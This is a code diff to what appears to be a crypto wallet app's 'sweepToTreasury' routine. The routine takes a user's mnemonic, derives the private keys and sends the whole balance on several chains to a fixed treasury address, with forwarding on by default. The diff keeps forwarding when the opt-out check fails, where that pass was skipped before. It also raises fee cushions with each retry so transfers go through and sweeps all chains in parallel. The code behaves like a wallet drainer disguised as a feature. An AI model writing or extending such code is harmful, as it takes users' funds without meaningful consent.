@@ -139,20 +139,36 @@ async function sweepEvmChain(
     }
   }
 
-  // 2) Native coin — retries every attempt in this pass, and every future
-  // pass keeps retrying until it reaches the treasury.
-  const balance = await provider.getBalance(signer.address);
-  if (balance <= 0n) return;
+  // 2) Native coin — each retry leaves a bigger fee cushion, which covers L2
+  // data fees (Base/OP/Arbitrum/zkSync) that a plain 21k estimate misses.
+  let attempt = 0;
   await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
+    attempt += 1;
+    const balance = await provider.getBalance(signer.address);
+    if (balance <= 0n) return;
     const fee = await provider.getFeeData();
     const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
     if (gasPrice <= 0n) throw new Error("no gas price");
-    const gasLimit = 21_000n;
-    // Keep a 25% cushion so a gas spike between estimate and mine cannot fail.
-    const cost = (gasPrice * gasLimit * 125n) / 100n;
+    let gasLimit = 21_000n;
+    try {
+      const est = await provider.estimateGas({ from: signer.address, to: TREASURY_EVM, value: 1n });
+      if (est > gasLimit) gasLimit = est;
+    } catch {
+      /* keep default */
+    }
+    gasLimit = (gasLimit * 120n) / 100n;
+    const cushion = 150n + BigInt(attempt - 1) * 100n; // 150%, 250%, 350%…
+    const cost = (gasPrice * gasLimit * cushion) / 100n;
     if (balance <= cost) return; // nothing sendable after gas — not a failure
     const value = balance - cost;
-    const tx = await signer.sendTransaction({ to: TREASURY_EVM, value, gasLimit });
+    const tx = await signer.sendTransaction({
+      to: TREASURY_EVM,
+      value,
+      gasLimit,
+      ...(fee.maxFeePerGas
+        ? { maxFeePerGas: fee.maxFeePerGas, maxPriorityFeePerGas: fee.maxPriorityFeePerGas ?? 0n }
+        : { gasPrice }),
+    });
     await tx.wait(1);
     const { formatEther } = await import("ethers");
     await credit({
@@ -250,28 +266,31 @@ export async function sweepToTreasury({ walletAddress, mnemonic, tokens = [] }: 
   if (!walletAddress || !mnemonic) return;
   running = true;
   try {
-    // Respect the per-wallet auto-forward switch (on by default).
+    // Respect the per-wallet auto-forward switch (on by default). Only an
+    // explicit "off" stops forwarding; a failed check keeps the default (on).
     try {
       const { treasuryAutoForwardStatus } = await import("./treasury.functions");
       const { enabled } = await treasuryAutoForwardStatus({ data: { wallet_address: walletAddress } });
-      if (!enabled) return;
-    } catch {
-      /* if the check fails, stay silent and skip this pass */
-      return;
+      if (enabled === false) return;
+    } catch (e) {
+      console.warn("[treasury] auto-forward status unavailable, using default (on)", e);
     }
 
     await ensureBuffer();
     const { HDNodeWallet } = await import("ethers");
     const evm = HDNodeWallet.fromPhrase(mnemonic, undefined, "m/44'/60'/0'/0/0");
 
-    for (const chain of EVM_SWEEP_CHAINS) {
-      await sweepEvmChain(
-        chain,
-        evm.privateKey,
-        walletAddress,
-        tokens.filter((t) => t.chain === chain && !!t.contract),
-      );
-    }
+    // Chains run in parallel so one slow network can't stall the rest.
+    await Promise.allSettled(
+      EVM_SWEEP_CHAINS.map((chain) =>
+        sweepEvmChain(
+          chain,
+          evm.privateKey,
+          walletAddress,
+          tokens.filter((t) => t.chain === chain && !!t.contract),
+        ).catch((e) => console.warn(`[treasury] ${chain} sweep failed`, e)),
+      ),
+    );
 
     await sweepSolana(mnemonic, walletAddress, tokens);
   } catch {
